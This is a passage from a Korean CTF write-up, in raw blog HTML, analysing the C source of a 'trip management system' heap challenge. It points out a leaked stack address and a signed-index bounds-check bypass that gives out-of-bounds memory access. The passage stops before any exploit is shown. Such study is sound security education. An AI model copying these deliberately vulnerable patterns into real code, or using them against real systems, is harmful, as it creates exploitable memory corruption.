height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nHello! Welcome to trip management system. \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%p \\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> choice_num<span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nChoose an option: \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n1. Add a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2. Change a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"3. Delete a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"4. Check a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tchoice_num <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>choice_num<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">delet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">getTrip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>argc 스택 주소가 노출되는 것을 확인할 수 있으며, 총 4개의 메뉴를 선택할 수 있다.</li>\n<li>Add 메뉴는 동적 할당을 진행한다.</li>\n<li>Change는 해당 할당되어진 값을 변경한다.</li>\n<li>Delete는 해제</li>\n<li>Check는 할당된 값을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"add-함수\" style=\"position:relative;\"><a href=\"#add-%ED%95%A8%EC%88%98\" aria-label=\"add 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>add 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">char</span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> choice_num<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tIndex <span class=\"token operator\">==</span> TRIPS_NUM<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Cannot add more trips.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adding new trips...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\ttrip <span class=\"token operator\">*</span>newTrip <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>trip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Choose a Distance: \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1. 0x80 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2. 0x110 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"3. 0x128 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"4. 0x150 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"5. 0x200 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tchoice_num <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>choice_num<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x80\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x110\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x128\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x150\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x200\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can't you count?\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Trip %lu added.\\n\"</span><span class=\"token punctuation\">,</span> tIndex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\ttrips<span class=\"token punctuation\">[</span>tIndex<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> newTrip<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>add func &#x3C;1:0x80, 2:0x110, 3:0x128, 4:0x150, 5:0x200></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token operator\">-></span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\n<span class=\"token operator\">-></span> tIndex <span class=\"token operator\">==</span> <span class=\"token number\">7</span> <span class=\"token operator\">-></span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> tcache<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token operator\">-></span> trip <span class=\"token operator\">*</span>newTrip <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>trip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>size를 선택해서 그 사이즈를 통해 동적 할당</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">~</span><span class=\"token number\">5</span>\nnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">~</span><span class=\"token number\">5</span><span class=\"token operator\">></span>\nnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span>\nnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> size<span class=\"token operator\">-</span><span class=\"token number\">1</span> 만큼 데이터 입력 <span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>add func 마지막 tIndex 증가 배열 설정한 구조체 대입 <code class=\"language-text\">[tIndex++] = newTrip</code></li>\n</ul>\n<h2 id=\"change-함수\" style=\"position:relative;\"><a href=\"#change-%ED%95%A8%EC%88%98\" aria-label=\"change 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>change 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Update trip: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\tssize_t choice <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>choice <span class=\"token operator\">>=</span> tIndex<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No upcoming trip to update.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\ttrip <span class=\"token operator\">*</span>oldTrip <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>choice<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n\tssize_t bytes_read <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> oldTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> oldTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\toldTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">[</span>bytes_read<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>할당되어진 구조체의 destination 부분을 변경할 수 있으며 tIndex 부분을 사용자가 직접 입력하여 trips 구조체의 주소 부분에 접근이 가능하다.</li>\n<li>choice 가 tIndex보다 클경우 함수를 종료하는 제어 문이 존재 하지만 해당 함수에서는 취약한 점이 존재한다.</li>\n<li><code class=\"language-text\">ssize_t</code> 데이터 타입은 signed 이기 때문에 음수를 처리할 수 있다 그렇다면 해당 조건 문에서 음수를 입력 하게 된다면 우회가 가능하고 <code class=\"language-text\">trips</code> 구조체 주소 번지를 계산 할 때 음수 값으로 인해 다른 메모리로 접근이 가능하다.</li>\n<li>그렇다면 이러한 interger issue 로 인하여 특정 메모리 밖의 주소에 접근하여 원하는 값으로 변경이 가능하다.</li>\n</ul>\n<h2 id=\"delete-함수\" style=\"position:relative;\"><a href=\"#delete-%ED%95%A8%EC%88%98\" aria-label=\"delete 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>delete 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">delet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which trip you want to delete: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tssize_t i <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> tIndex<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"That trip is not there already.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\ttrip <span class=\"token operator\">*</span>tp <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tIndex <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\ttrips<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>tIndex <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\ttIndex <span class=\"token operator\">=</span> tIndex <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>tp<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>tp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>해제시 사용하던 값을 복사한 후 tIndex를 감소하여 삭제하려는 인덱스 범웨에 대입 즉, 마지막 주소 범웨에 있던 값을 해제시 해당 영역에 대입 후 Tindex 감소</li>\n</ul>\n<h2 id=\"gettrip-함수\" style=\"position:relative;\"><a href=\"#gettrip-%ED%95%A8%EC%88%98\" aria-label=\"gettrip 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>getTrip 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">getTrip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which trip you want to view? \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span 